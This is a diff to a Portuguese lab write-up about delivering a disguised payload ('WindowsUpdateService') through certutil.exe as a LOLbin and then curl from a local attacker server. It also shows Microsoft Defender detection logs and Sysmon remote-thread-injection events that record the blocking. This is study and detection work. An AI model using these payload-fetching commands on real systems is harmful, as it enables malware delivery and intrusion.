@@ -232,7 +232,46 @@ Aqui realizei o brute force e consegui uma senha:
 Logo apos realizei a requisicao usando certutil.exe como LOLbin:
 
  [CERTUTIL.exe COMMAND]
-![Image](https://github.com/user-attachments/assets/30188fa6-c789-4413-b6bb-342a29d9f40c)
+ 
+![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)
+
+A principio pensei que o certutil.exe tivesse baixado o malware e logo apos o malware ter sido bloqueado pelo Windows Defender entretanto notei que nao havia 
+nenhum aviso de requisicao GET recebida pelo python server(como pode ser visto no screenchot acima) o que me leva a pensar que o sistema bloqueou a requisicao antes de ser feita. 
+Para tirar a duvida tentei realizar uma requisicao para um site benigno google.com mas recebi o mesmo output do windows, procurando nos logs do event viewer encontrei esse registro
+
+🔍 **Microsoft Defender Detection Log**
+```
+- **Product**: Microsoft Defender Antivirus  
+- **Product Version**: 4.18.25040.2  
+- **Detection ID**: {5BE40275-E18B-40CA-8D0A-659F906123B2}  
+- **Detection Time**: 2025-05-27 15:29:04 UTC  
+- **Threat Name**: Trojan:Win32/Ceprolad.A  
+- **Severity**: Severe  
+- **Category**: Trojan  
+- **Detection User**: NT AUTHORITY\SYSTEM  
+- **Process Name**: Unknown  
+- **Command Line**: `certutil.exe -urlcache -split -f https://google.com`  
+- **Path**: C:\Windows\System32\certutil.exe  
+- **Action Taken**: Not Applicable (automatically blocked)  
+- **Engine Version**: AM: 1.1.25040.1  
+- **Signature Version**: AV: 1.429.193.0  
+- **Reference**: [Microsoft Threat Info](https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0)
+```
+
+
+
+ Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as, 
+ ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao obser somente o destino das requisicoes mas 
+ tem o comportanto do servicos (behaviour-based).
+
+
+
+
+
+Sendo assim decidi executar o delivery de uma forma mais simples atraves de uma requisicao curl 
+
+```curl http://192.168.56.101:7070/WindowsUpdateService```
+![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)
 
 
  Infelizmente eu nao consegui ofuscar o antivirus p suficiente a ponto de nao ser detectado pelo sistema de defesa
@@ -266,9 +305,23 @@ Durante a execução do payload ofuscado, mesmo antes de um shell ser estabeleci
  ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
 Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Apesar do Defender ou outro mecanismo ter bloqueado a carga útil antes da execução total, o evento mostra que o payload chegou a tentar a injeção de código na memória de outro processo. Isso por si só é uma IOC (Indicator of Compromise) que foi provavelmente o que acionou o segundo log
 
-3. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
+2. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
 ![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
 Pouco após a tentativa de injeção de thread remota registrada pelo Sysmon (Event ID 8), o processo SecurityHealthHost.exe, parte do Windows Defender, foi invocado. Isso sugere que a carga maliciosa foi identificada e bloqueada pela solução nativa do sistema, interrompendo a execução completa do ataque.
+
+3.[CCONFIRMACAO DO BLOQUEIO NO WINDOWS DEFENDER LOGS]
+
+```🔍 Detecção pelo Microsoft Defender:
+
+Threat Name:      Trojan:Win32/Ceprolad.A  
+Severity:         Severe  
+Detection Time:   2025-05-27 20:29:56 UTC  
+Detected By:      NT AUTHORITY\SYSTEM  
+Process Name:     certutil.exe  
+Command Line:     certutil.exe -urlcache -split -f https://[URL_REDACTED]  
+Path:             C:\Windows\System32\certutil.exe  
+Action Taken:     Not Applicable (bloqueio automático durante o download)  
+```
 
 
 ##CONCLUSAO 
